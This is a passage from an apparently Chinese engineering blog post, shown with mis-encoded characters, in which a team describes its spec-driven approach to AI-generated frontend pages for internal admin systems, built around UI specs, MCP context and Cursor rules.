blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä»ä¸‰ä¸ªç–‘é—®è°ˆè°ˆæˆ‘ä»¬çš„æ ¸å¿ƒç†å¿µ</h2>
<p>AIèƒ½å†™ä»£ç æ—©å·²ä¸æ˜¯æ–°é²œè¯é¢˜ï¼Œä½†å½“å®ƒè¢«å¼•å…¥çœŸå®çš„æ—¥å¸¸å¼€å‘æµç¨‹æ—¶ï¼Œå·¥ç¨‹å±‚é¢çš„é—®é¢˜æ‰çœŸæ­£å¼€å§‹æš´éœ²ï¼š</p>
<ul>
<li><strong>ä¸ºä»€ä¹ˆåœ¨å¤šæ•°å›¢é˜Ÿé‡Œï¼ŒAI å†™ä»£ç ä»ç„¶æ—¶å¥½æ—¶åï¼Ÿ</strong></li>
<li><strong>ä¸ºä»€ä¹ˆåŒæ ·ä¸€å¥æŒ‡ä»¤ï¼Œæœ‰æ—¶åƒèµ„æ·±å·¥ç¨‹å¸ˆï¼Œæœ‰æ—¶å´åƒå®ä¹ ç”Ÿï¼Ÿ</strong></li>
<li><strong>ä¸ºä»€ä¹ˆç”Ÿæˆé€Ÿåº¦ä¸Šæ¥äº†ï¼Œä»£ç å´è¶Šæ¥è¶Šéš¾ç»´æŠ¤ï¼Ÿ</strong></li>
</ul>
<p>è¿™äº›å›°æƒ‘å¹¶ä¸æ„å¤–â€”â€”<strong>å®ƒä»¬å‡ ä¹æ˜¯å½“å‰ AI Coding çš„â€œå¸¸æ€ä½“éªŒâ€ã€‚</strong>
ä½†æ˜¯åœ¨æˆ‘ä»¬çš„ä¸­åå°ç³»ç»Ÿä¸­ï¼ŒAI Coding å´èƒ½æŒç»­ç¨³å®šåœ°é«˜è´¨é‡è¾“å‡ºï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜è½åœ°äº†ç›¸å…³çš„ä¸€å¥—å·¥ç¨‹ä½“ç³»ï¼Œæ•ˆæœéå¸¸ç›´æ¥ï¼š</p>
<p>åŸæ¥ä¸€ä¸ªé¡µé¢å‰ç«¯ç¼–ç éœ€è¦åŠå¤©ï¼Œç°åœ¨åªéœ€è¦ä¸€å¥è¯ â†’ 5ï½10åˆ†é’Ÿå°±è‡ªåŠ¨ç”Ÿæˆã€å¯ç›´æ¥è¿è¡Œã€‚</p>
<p>ä¸ä»…é€Ÿåº¦å¿«ï¼Œè´¨é‡è¿˜ç¨³å¾—æƒŠäººâ€”â€”<strong>åŒä¸€ä¸ªéœ€æ±‚ï¼Œä¸åŒäººç”Ÿæˆçš„ä»£ç ç»“æ„å®Œå…¨ä¸€è‡´ï¼Œåƒæ˜¯èµ„æ·±å·¥ç¨‹å¸ˆå†™å‡ºæ¥çš„ã€‚</strong></p>
<p>è¿™æ„å‘³ç€ï¼š</p>
<ul>
<li>ç ”å‘ä»å¤§é‡é‡å¤ç¼–ç ä¸­è§£æ”¾å‡ºæ¥ï¼ŒæŠŠç²¾åŠ›æŠ•å…¥åˆ°å¤æ‚é—®é¢˜ã€æ¶æ„è®¾è®¡ä¸ä½“éªŒæ‰“ç£¨ä¸Šï¼›</li>
<li>æ–°äººå…¥èŒå³å¯äº¤ä»˜ï¼Œæ— éœ€å…ˆèŠ±æ—¶é—´ç†Ÿæ‚‰åºå¤§çš„æ¡†æ¶ç»†èŠ‚ï¼›</li>
<li>å›¢é˜Ÿæ•´ä½“äº¤ä»˜é€Ÿåº¦æˆå€æå‡ï¼Œè´¨é‡æ›´å¯æ§ã€‚</li>
</ul>
<p>ç›®å‰é›ªçƒå†…éƒ¨<strong>è¿‘60%</strong> çš„ä¸­åå°æ–°é¡µé¢ç”± AI Coding è‡ªåŠ¨ç”Ÿæˆã€‚</p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼š</p>
<p>ä¸ºä»€ä¹ˆåŒæ ·ä½¿ç”¨ AIï¼Œå·®è·ä¼šå¦‚æ­¤ä¹‹å¤§ï¼Ÿ</p>
<p>ç­”æ¡ˆï¼Œä¸åœ¨æ¨¡å‹æœ¬èº«ï¼Œè€Œåœ¨äºâ€”â€”æœ‰æ²¡æœ‰å»ºç«‹ä¸€å¥—äººä¸ AI çš„æ ‡å‡†åŒ–æ²Ÿé€šæ–¹å¼ã€‚è‡ªç„¶è¯­è¨€æœ¬èº«å…·æœ‰æ¨¡ç³Šæ€§ï¼Œè€Œè½¯ä»¶å¼€å‘å´é«˜åº¦ä¾èµ–ç²¾ç¡®è¡¨è¾¾ï¼Œè¿™ç§å¼ åŠ›æ­£æ˜¯å·®è·äº§ç”Ÿçš„æ ¹æºã€‚</p>
<p>å¯¹æ­¤ï¼Œäºšé©¬é€Šäº‘ç§‘æŠ€é¦–å¸­è½¯ä»¶å·¥ç¨‹å¸ˆ Claire Liguori åœ¨å…¶å…³äº Kiro IDE çš„å®è·µä¸­æŒ‡å‡ºï¼Œå¼€å‘è€…è¦æƒ³è®© AI ç”Ÿæˆç¬¦åˆé¢„æœŸçš„è½¯ä»¶ï¼Œå°±å¿…é¡»é‡‡ç”¨ä¸€ç§æ›´åŠ ç»“æ„åŒ–ã€ç²¾ç¡®çš„æ²Ÿé€šæ–¹å¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éµå¾ªçš„æ ¸å¿ƒç†å¿µï¼š<strong>Spec-driven developmentï¼ˆè§„èŒƒé©±åŠ¨å¼€å‘ï¼‰ï¼Œé€šè¿‡æ ‡å‡†åŒ–ã€å¯éªŒè¯çš„è§„èŒƒï¼Œå°†æ¨¡ç³Šéœ€æ±‚è½¬åŒ–ä¸ºå¯æ‰§è¡Œã€å¯è¿½æº¯çš„å·¥ç¨‹è¿‡ç¨‹ã€‚</strong></p>
<p>äºšé©¬é€Š CTO Werner Vogels ä¹Ÿæ›¾æ›´è¿›ä¸€æ­¥å¼ºè°ƒï¼ŒSpec-driven development ä¸æ˜¯å®˜åƒšä¸»ä¹‰ï¼Œè€Œæ˜¯ä¸€ç§å·¥ç¨‹çºªå¾‹ï¼›Apollo ç™»æœˆé¡¹ç›®çš„æˆåŠŸï¼Œåœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šæ­£æ˜¯å»ºç«‹åœ¨è¿™ç§çºªå¾‹ä¹‹ä¸Šã€‚</p>
<p>é‚£æˆ‘ä»¬å…·ä½“æ˜¯å¦‚ä½•è·µè¡Œ Spec-driven development çš„å‘¢ï¼Ÿæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å…ˆä» <strong>Spec Coding ä¸ Vibe Coding çš„åŒºåˆ«</strong> è¯´èµ·ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€ä¸ºä»€ä¹ˆæ˜¯ Spec Codingï¼Œè€Œä¸æ˜¯ Vibe Coding</h2>
<h3 data-id="heading-2">1ã€Vibe Codingï¼šçœ‹èµ·æ¥å¾ˆèªæ˜ï¼Œç”¨èµ·æ¥å¾ˆå¿ƒè™š</h3>
<p>2025å¹´2æœˆï¼ŒOpenAI è”åˆåˆ›å§‹äººã€AI ç ”ç©¶è€… Andrej Karpathy é¦–æ¬¡æå‡º Vibe Codingï¼ˆæ°›å›´ç¼–ç¨‹ï¼‰ï¼Œå¼•å‘äº†ç¼–ç¨‹çš„æ–°å˜é©ã€‚ä¾‹å¦‚ï¼Œä½ ç»™å®ƒä¸€å¥æŒ‡ä»¤ï¼š</p>
<blockquote>
<p><em>â€œåšä¸€ä¸ªæœ‰åˆ—è¡¨å’Œæœç´¢çš„ç”¨æˆ·ç®¡ç†é¡µâ€</em></p>
</blockquote>
<p>å®ƒä¼šå†™ä»£ç ï¼Œå†™å¾—è¿˜æŒºåƒå›äº‹ã€‚</p>
<p>ä½†ä¸€æ—¦è¿›å…¥çœŸå®å·¥ç¨‹ï¼Œå°±ä¼šæš´éœ²é—®é¢˜ï¼š</p>
<ul>
<li><strong>æ˜“å‡ºç°ç†è§£åå·®</strong>ï¼šæ¥å£ã€å­—æ®µã€ä¸šåŠ¡é€»è¾‘ç»å¸¸â€œå‡­ç©ºè¢« AI æƒ³è±¡å‡ºæ¥â€ï¼›</li>
<li><strong>é£æ ¼ä¸ç»Ÿä¸€</strong>ï¼šæ¯æ¬¡ç”Ÿæˆç»“æ„éƒ½ä¸ä¸€æ ·ï¼Œâ€œåƒæ¯ä¸ªå·¥ç¨‹å¸ˆé£æ ¼éƒ½å®Œå…¨ä¸åŒâ€ï¼›</li>
<li><strong>è¶Šå¤æ‚è¶Šä¸ç¨³</strong>ï¼šè·¨æ¨¡å—ã€æ ¡éªŒé€»è¾‘ã€å¤šçŠ¶æ€å¤„ç†ã€å¤æ‚ç»„ä»¶ç­‰æƒ…å†µå®¹æ˜“å´©æºƒï¼›</li>
<li><strong>ç»´æŠ¤å›°éš¾</strong>ï¼šä»£ç ä¸æ˜¯ä¸èƒ½ç”¨ï¼Œä½†åŠå¹´åå›¢é˜Ÿæ²¡äººæ•¢åŠ¨ã€‚</li>
</ul>
<p>ä¸€å¥è¯æ€»ç»“ï¼š</p>
<p><strong>Vibe Coding = å³å…´å‘æŒ¥ï¼Œçˆ½åœ¨å½“ä¸‹ï¼Œç—›åœ¨ç»´æŠ¤ã€‚</strong></p>
<p>é€‚åˆ Demoã€ä¸ä¸¥è°¨çš„ä¸šåŠ¡è¯„å®¡ã€åŸå‹éªŒè¯ã€‚<strong>ä½†æ— æ³•æˆä¸ºå·¥ç¨‹ä½“ç³»ï¼Œéš¾ä»¥æ”¯æ’‘ä¼ä¸šå¤§è§„æ¨¡çœŸå®é¡¹ç›®ã€‚</strong></p>
<h3 data-id="heading-3">2ã€Spec Codingï¼šè®© AI æŒ‰â€œè§„æ ¼â€å·¥ä½œï¼Œè€Œä¸æ˜¯é æ„Ÿè§‰</h3>
<p>2025 å¹´ä¸‹åŠå¹´äºšé©¬é€Šã€OpenAIç­‰å¤´éƒ¨å¤§å‚ç›¸ç»§æå‡º Spec Coding ç›¸å…³ç†å¿µï¼Œå³â€œè§„æ ¼é©±åŠ¨å¼€å‘â€ï¼Œé€æ¸è¢«ç¤¾åŒºå’Œå¹³å°é‡‡çº³ ã€‚Spec çš„æœ¬è´¨æ˜¯ï¼š<strong>æŒ‡ä»¤ä¸æ˜¯â€œæ„Ÿè§‰å¼â€ï¼Œè€Œæ˜¯â€œç»“æ„åŒ–ã€å¯è§£æã€é›¶æ­§ä¹‰â€ã€‚</strong></p>
<p>ä¸¾ä¾‹ï¼š</p>
<blockquote>
<p><em>â€œç”Ÿæˆä¸€ä¸ªæ ‡å‡†çš„ç”¨æˆ·ç®¡ç†é¡µ</em></p>
<p><em>æ•°æ®æ¥å£ï¼š/user/listï¼ˆGETï¼‰</em></p>
<p><em>åŒ…å«æœç´¢ï¼šnameï¼ˆè¾“å…¥æ¡†ï¼‰ã€statusï¼ˆä¸‹æ‹‰ï¼‰</em></p>
<p><em>åˆ—è¡¨å­—æ®µï¼šnameã€statusã€createTime</em> <em>æ”¯æŒåˆ†é¡µã€æ‰¹é‡åˆ é™¤ã€‚â€</em></p>
</blockquote>
<p>è¿™æ˜¯ AI æœ€æ“…é•¿å¤„ç†çš„è¾“å…¥ï¼š<strong>å›ºå®šæ ¼å¼ã€å¼ºç»“æ„åŒ–ã€æœ‰æ˜ç¡®ä¸Šä¸‹æ–‡ã€‚</strong></p>
<p>å¥½å¤„ä¹Ÿæå…¶æ˜¾è‘—ï¼š</p>
<ul>
<li><strong>å®Œå…¨é¿å…å¹»è§‰</strong>ï¼šæ‰€æœ‰å­—æ®µã€æ¥å£ã€ç»„ä»¶éƒ½ä»è§„èŒƒè§£æï¼›</li>
<li><strong>ä»£ç è´¨é‡ç¨³å®šå¦‚åŒèµ„æ·±å·¥ç¨‹å¸ˆ</strong>ï¼šç»“æ„ç»Ÿä¸€ã€æŠ½è±¡ä¸€è‡´ã€å¯ç»´æŠ¤ï¼›</li>
<li><strong>è·¨é¡¹ç›®å¤§è§„æ¨¡å¤ç”¨</strong>ï¼šè§„èŒƒä½“ç³» + Agentèƒ½åŠ› = è‡ªåŠ¨ç”Ÿæˆèƒ½åŠ›ï¼›</li>
<li><strong>è¶Šåšè¶Šå¼º</strong>ï¼šè§„èŒƒä½“ç³»çš„ç§¯ç´¯ä¸å®Œå–„ä¼šæŒç»­å¢å¼ºç¼–ç¨‹èƒ½åŠ›ã€‚</li>
</ul>
<p>ä¸€å¥è¯æ€»ç»“ï¼š</p>
<p><strong>Spec Coding = é¢å‘å·¥ç¨‹ä½“ç³»çš„ AI ç”Ÿäº§æ–¹å¼ã€‚</strong></p>
<p>å®ƒå…³æ³¨çš„ä¸æ˜¯â€œä¸€æ¬¡å†™å¾—æœ‰å¤šå¿«â€ï¼Œè€Œæ˜¯<strong>é•¿æœŸæ˜¯å¦ç¨³å®šã€æ˜¯å¦å¯æ§ã€æ˜¯å¦èƒ½è§„æ¨¡åŒ–è½åœ°</strong>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cdd28f8e16f44979ae550f90a926d5b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuq55CD5bel56iL5biI5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400734&amp;x-signature=rQHLxWhvfZj0Vq%2ByIz9IlqKIDII%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">å°ç»“ï¼šç¨‹åºå‘˜ä¸æ˜¯è¢«æ›¿ä»£ï¼Œè€Œæ˜¯å®Œæˆäº†ä¸€æ¬¡è§’è‰²å‡çº§</h3>
<p>åœ¨ AI æ—¶ä»£ï¼Œæ›´æœ‰ä»·å€¼çš„èƒ½åŠ›ï¼Œä¸å†åªæ˜¯â€œæŠŠä»£ç å†™å‡ºæ¥â€ï¼Œè€Œæ˜¯â€œç²¾å‡†è¡¨è¾¾æ„å›¾çš„æ²Ÿé€šâ€ã€‚å°†ç›®æ ‡ã€çº¦æŸä¸æˆåŠŸæ ‡å‡†ç­‰å†…å®¹ä¸¥å¯†é€šè¿‡è§„èŒƒç»“æ„åŒ–çš„è¡¨è¾¾å†™è¿›è§„èŒƒï¼Œä»£ç åªæ˜¯æ²Ÿé€šä¸å†³ç­–åçš„ä¸€ç§ä¸‹æ¸¸äº§ç‰©ã€‚ç¨‹åºå‘˜çš„ä»·å€¼ç”±å†™ä»£ç è½¬ä¸ºå†™è§„èŒƒï¼Œ<strong>å³ç¨‹åºå‘˜è´Ÿè´£æˆ˜ç•¥ï¼ˆå®šä¹‰åšä»€ä¹ˆä»¥åŠä¸ºä»€ä¹ˆï¼‰ï¼ŒAIè´Ÿè´£æˆ˜æœ¯ï¼ˆç²¾ç¡®åœ°å®ç°å¦‚ä½•åšï¼‰ã€‚</strong></p>
<p>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸­åå°ç³»ç»Ÿé€‰æ‹© Spec Codingï¼Œè€Œä¸æ˜¯ Vibe Codingã€‚é‚£æˆ‘ä»¬æ˜¯å¦‚ä½•åœ¨ä¸­åå°ä½“ç³»è½åœ°çš„å‘¢ï¼Ÿ</p>
<h2 data-id="heading-5">äºŒã€AI Coding çš„ç°å®æŒ‘æˆ˜ä¸ä¸­åå°ç³»ç»Ÿçš„å¥‘åˆç‚¹</h2>
<p>åœ¨ç»å†äº†ä»ä»£ç è¡¥å…¨åˆ°æ™ºèƒ½ç”Ÿæˆçš„å¿«é€Ÿæ¼”è¿›åï¼ŒAI Coding çš„èƒ½åŠ›å·²ç»è¿›å…¥â€œå¯ç”¨ä½†ä¸ç¨³å®šâ€çš„é˜¶æ®µã€‚å®ƒèƒ½ç†è§£è‡ªç„¶è¯­è¨€ç”Ÿæˆç»“æ„åŒ–ä»£ç ï¼Œæ˜¾è‘—æå‡ç ”å‘æ•ˆç‡ï¼Œå´ä¹Ÿåœ¨å·¥ç¨‹è½åœ°ä¸­æš´éœ²å‡ºä¸€ç³»åˆ—é—®é¢˜ï¼š</p>
<ul>
<li>
<p><strong>ç†è§£åå·®ä¸å¹»è§‰é—®é¢˜</strong>ï¼šæ¨¡å‹å¯èƒ½å‡­ç©ºç”Ÿæˆä¸å­˜åœ¨çš„å‡½æ•°æˆ–æ¥å£ï¼Œæˆ–å› éœ€æ±‚æè¿°æ¨¡ç³Šè€Œè¯¯è§£é€»è¾‘ï¼Œå¯¼è‡´è¾“å‡ºç»“æœçœ‹ä¼¼æ­£ç¡®å´æ— æ³•è¿è¡Œï¼›</p>
</li>
<li>
<p><strong>ä»£ç è´¨é‡ä¸è§„èŒƒä¸ç»Ÿä¸€</strong>ï¼šç”Ÿæˆä»£ç æ˜“å‡ºç°å†—ä½™è†¨èƒ€ã€é£æ ¼ä¸ç»Ÿä¸€ã€ç¼ºä¹æŠ½è±¡ä¸å¤ç”¨ï¼ŒçŸ­æœŸå¯ç”¨ï¼Œé•¿æœŸç»´æŠ¤æˆæœ¬é«˜ï¼›</p>
</li>
<li>
<p><strong>å¤æ‚åœºæ™¯éš¾æŠŠæ¡</strong>ï¼šåœ¨å¤æ‚åœºæ™¯ä¸‹å®¹æ˜“å‡ºç°é€»è¾‘ä¸ä¸€è‡´ã€ä¸Šä¸‹æ–‡ç†è§£ä¸å®Œæ•´ã€ä»£ç ç»“æ„æ··ä¹±ç­‰é—®é¢˜ï¼Œéš¾ä»¥ç¨³å®šç”Ÿæˆå¯ç›´æ¥è½åœ°çš„å·¥ç¨‹çº§æ–¹æ¡ˆã€‚</p>
</li>
</ul>
<p>å¯ä»¥è¯´ï¼Œ<strong>å½“å‰çš„ AI Coding å¤„ç†â€œæ¨¡æ¿åŒ–â€çš„åœºæ™¯æ›´ç²¾å‡†</strong>ï¼Œè€Œåœ¨æ¶‰åŠå¤æ‚ä¸šåŠ¡é€»è¾‘æ—¶é—®é¢˜ä¼šæ˜¾è‘—å¢å¤šã€‚å½“ä»»åŠ¡æè¿°æ¸…æ™°ã€ç»“æ„æ˜ç¡®æ—¶ï¼ŒAI èƒ½é«˜æ•ˆç”Ÿæˆé«˜è´¨é‡ä»£ç ï¼›ä½†é¢å¯¹æŠ½è±¡ã€ä¾èµ–ä¸Šä¸‹æ–‡ç†è§£çš„ä¸šåŠ¡éœ€æ±‚æ—¶ï¼Œå¾€å¾€å®¹æ˜“å‡ºç°åå·®æˆ–ç†è§£é”™è¯¯ã€‚</p>
<p>ä¸­åå°ç³»ç»Ÿç›¸å¯¹äºCç«¯éœ€æ±‚è€Œè¨€ï¼Œæœ‰ç€æ›´å¼ºçš„â€œè§„å¾‹æ€§â€å’Œâ€œç»“æ„åŒ–â€ç‰¹å¾ï¼Œè¿™ä¸ AI Coding åœ¨è§„åˆ™æ˜ç¡®ã€ç»“æ„æ¸…æ™°åœºæ™¯ä¸­çš„ä¼˜åŠ¿é«˜åº¦å¥‘åˆã€‚ä¸­åå°åœºæ™¯å…·å¤‡ä»¥ä¸‹å¤©ç„¶ä¼˜åŠ¿ï¼š</p>
<ul>
<li><strong>ç»“æ„åŒ–ä¸”è§„èŒƒåŒ–</strong>ï¼šä¸­åå°é¡µé¢ä»¥è¡¨æ ¼ã€è¡¨å•ã€æœç´¢ç­‰æ¨¡å—ä¸ºä¸»ï¼ŒåŠŸèƒ½æ¨¡å¼å›ºå®šã€ç»„ä»¶ä½“ç³»è§„èŒƒä¸”å®Œå–„ã€‚èƒ½æœ‰æ•ˆçº¦æŸç”Ÿæˆç»“æœï¼Œé™ä½â€œå¹»è§‰â€é£é™©ï¼›</li>
<li><strong>è§„æ¨¡å¤§ä¸”å¯æ§</strong>ï¼šä¸­åå°ä¸šåŠ¡é¡µé¢æ•°é‡å¤šã€ç›¸ä¼¼åº¦é«˜ï¼Œé…åˆç»Ÿä¸€æ¨¡æ¿å’Œè§„èŒƒä½“ç³»ï¼ŒAI èƒ½åœ¨æ­¤ç±»åœºæ™¯ä¸­å®ç°é«˜æ•ˆã€æ‰¹é‡çš„ä»£ç ç”Ÿæˆä¸ç»´æŠ¤ï¼ŒåŠ é€Ÿéœ€æ±‚äº¤ä»˜çš„å…¨æµç¨‹ã€‚</li>
</ul>
<p>å°ç»“ï¼š<strong>ä¸­åå°å¼€å‘åœºæ™¯å…¼å…·â€œé«˜é‡å¤æ€§â€ä¸â€œå¼ºè§„èŒƒæ€§â€</strong> ï¼Œéå¸¸é€‚åˆé€šè¿‡ Spec Coding å®ç° AI Coding çš„ç¬¬ä¸€è½åœ°åœºæ™¯ã€‚å®ƒè®©å›¢é˜Ÿåœ¨ç¡®ä¿å¯ç»´æŠ¤æ€§çš„åŒæ—¶ï¼Œå¿«é€Ÿç§¯ç´¯é«˜è´¨é‡çš„ AI ç”Ÿæˆæ ·æœ¬ï¼Œå¹¶é€æ­¥å‘æ›´å¤æ‚çš„ä¸šåŠ¡é€»è¾‘å»¶ä¼¸ã€‚</p>
<h2 data-id="heading-6">ä¸‰ã€ä»æŒ‡ä»¤åˆ°äº¤ä»˜ï¼šç¨‹åºå‘˜ä¸AIæ˜¯å¦‚ä½•æ²Ÿé€šçš„ï¼Ÿ</h2>
<p>è¦è®©äººä¸ AI ä¹‹é—´å®ç°çœŸæ­£é«˜æ•ˆçš„æ²Ÿé€šï¼Œæˆ‘ä»¬æ²¡æœ‰è®¾è®¡å¤æ‚çš„æŒ‡ä»¤ï¼Œè€Œæ˜¯æç®€çš„ä¸€å¥è¯</p>
<blockquote>
<p><em>â€œå¸®æˆ‘æ ¹æ® [éœ€æ±‚æ–‡æ¡£åœ°å€] ç”Ÿæˆé¡µé¢ï¼Œå¹¶å¯¹æ¥[å…·ä½“ç¯å¢ƒ]çš„ä¸­å¤®æƒé™ç³»ç»Ÿâ€</em></p>
</blockquote>
<p>å³å¯è§¦å‘å®Œæ•´å·¥ä½œæµã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬æ‰“é€ äº†ä¸‰å¤§ Spec åˆ©å™¨ï¼Œå¹¶ä»¥ Cursor ä½œä¸ºæ‰¿è½½è¿™ä¸€åˆ‡çš„å·¥ä½œå°ï¼ŒæŠŠéœ€æ±‚å†…å®¹ã€æ¥å£ä¿¡æ¯ã€ä»£ç è§„èŒƒç­‰å…¨éƒ¨ç»“æ„åŒ–ï¼Œè®© AI èƒ½åœ¨ä¸€è½®æ²Ÿé€šä¸­å°±â€œå¬æ‡‚â€è¦åšä»€ä¹ˆï¼Œä»è€Œç¨³å®šäº§å‡ºå¯é çš„å·¥ç¨‹çº§ç»“æœã€‚</p>
<p><strong>Cursor ç¼–è¾‘å™¨</strong>ï¼šåœ¨ Cursor ä¸­ï¼Œæˆ‘ä»¬ç”¨ä¸€å¥è‡ªç„¶è¯­è¨€æŒ‡ä»¤å³å¯è§¦å‘å®Œæ•´å·¥ä½œæµï¼šè¯»å–éœ€æ±‚æ–‡æ¡£ã€è°ƒç”¨ MCP è·å–æ¥å£è¯­ä¹‰ã€å‚è€ƒUIè§„èŒƒå¹¶éµå¾ª rulesï¼Œç”Ÿæˆç¬¦åˆå·¥ç¨‹æ ‡å‡†çš„é¡µé¢ä»£ç ï¼Œå¹¶æœ€ç»ˆå¯¹æ¥ä¸­å¤®æƒé™ç³»ç»Ÿè¿›è¡Œæƒé™ç®¡ç†ã€‚Cursor å°†åˆ†æ•£çš„èƒ½åŠ›æ•´åˆä¸ºä¸€ä¸ªè¿ç»­çš„å¼€å‘ä½“éªŒï¼Œè®©â€œéœ€æ±‚â†’ä»£ç â†’è°ƒè¯•â€å½¢æˆé—­ç¯ï¼Œä½¿å¼€å‘è€…ä»ç¼–å†™ä»£ç è½¬å‘æŒ‡å¯¼ AI ç”Ÿäº§ä»£ç ã€‚</p>
<p><strong>ä¸‰å¤§ Spec åˆ©å™¨ï¼šUI è§„èŒƒç¡®ä¿é¡µé¢å±•ç¤ºä¸äº¤äº’ç»Ÿä¸€ï¼ŒMCP è¡¥å……é¡¹ç›®è¯­ä¹‰ä¸Šä¸‹æ–‡ï¼ŒRules ä½“ç³»ä¿éšœç”Ÿæˆè´¨é‡ã€‚</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e67585e64f24fb8a346304a53f09980~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuq55CD5bel56iL5biI5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400734&amp;x-signature=h6gJV45eZNs8IDE3%2BJb0RE5HS28%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">åˆ©å™¨ä¸€ï¼šUI è§„èŒƒä¸º AI ç¼–ç æ ‡å‡†åŒ–æä¾›åŸºç¡€</h3>
<p>ä¸­åå°ç³»ç»Ÿçš„ç•Œé¢è™½ç„¶ä»¥ä¸šåŠ¡ä¸ºä¸»ï¼Œä½†ä¸ºäº†ä¿è¯ç¾è§‚ä¸ä¸€è‡´çš„äº¤äº’ä½“éªŒï¼Œæˆ‘ä»¬åœ¨åˆæœŸå°±å»ºç«‹äº†ç³»ç»ŸåŒ–çš„ <strong>UI è§„èŒƒ</strong>ï¼Œå¹¶æ•´ç†æˆ UI Specï¼Œä¸ºåç»­çš„ AI Coding æä¾›äº†å¯å¤ç”¨ã€å¯ç”Ÿæˆçš„åŸºç¡€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a00c1631562431492d4b135ff79a0ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuq55CD5bel56iL5biI5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400734&amp;x-signature=9c7ktSvk51EG6UXjmPIZfpzOFzs%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7e4ae239bb04aa1ab8fad132d3a543e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuq55CD5bel56iL5biI5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400734&amp;x-signature=OWEBUne9tnaL%2B%2B0rbNH%2FV2QJCeI%3D" alt="" loading="lazy"/></p>
<p>è¿™å¥—è§„èŒƒä¸»è¦åŒ…å«ä¸¤å¤§æ–¹é¢ï¼š</p>
<ul>
<li><strong>è§†è§‰ä¸äº¤äº’æ ‡å‡†</strong>ï¼šç»Ÿä¸€ä¸»é¢˜ã€å­—ä½“ã€é—´è·ã€é¡µé¢æ¨¡å—å¸ƒå±€ã€æ“ä½œäº¤äº’ç­‰è§„åˆ™ï¼Œä½¿æ•´ä¸ªé¡¹ç›®ä¿æŒä¸€è‡´çš„è§‚æ„Ÿä¸æ“ä½œä½“éªŒï¼›</li>
<li><strong>ç»„ä»¶åŒ–ä½“ç³»</strong>ï¼šå¸¸ç”¨æ¨¡å—ï¼ˆæœç´¢æ¡†ã€åˆ—è¡¨ã€å¼¹çª—è¡¨å•ç­‰ï¼‰å‡æ¥è‡ªå…¬å…±ç»„ä»¶åº“ï¼ŒAI åœ¨ç”Ÿæˆé¡µé¢æ—¶å¯ä»¥ç›´æ¥å¤ç”¨ç°æœ‰æ ‡å‡†ç»„ä»¶è€Œéé‡æ–°é€ è½®å­ã€‚</li>
</ul>
<p>åŸºäºè¿™å¥—ä½“ç³»ï¼ŒAI Coding ä¸å†æ˜¯â€œéšæ„ç»˜åˆ¶ç•Œé¢â€ï¼Œè€Œæ˜¯åœ¨çº¦æŸä¸‹ç”Ÿæˆæ ‡å‡†åŒ–çš„ UIã€‚è¿™æ—¢èƒ½ä¿è¯æ‰€æœ‰ç•Œé¢çš„ä¸€è‡´æ€§ï¼Œä¹Ÿä¸ºè‡ªåŠ¨åŒ–å¼€å‘æä¾›åšå®åŸºç¡€ã€‚</p>
<h3 data-id="heading-8">åˆ©å™¨äºŒï¼šMCP æ˜¯ AI ç¼–ç çš„â€œä¿¡æ¯ä¸­æ¢â€</h3>
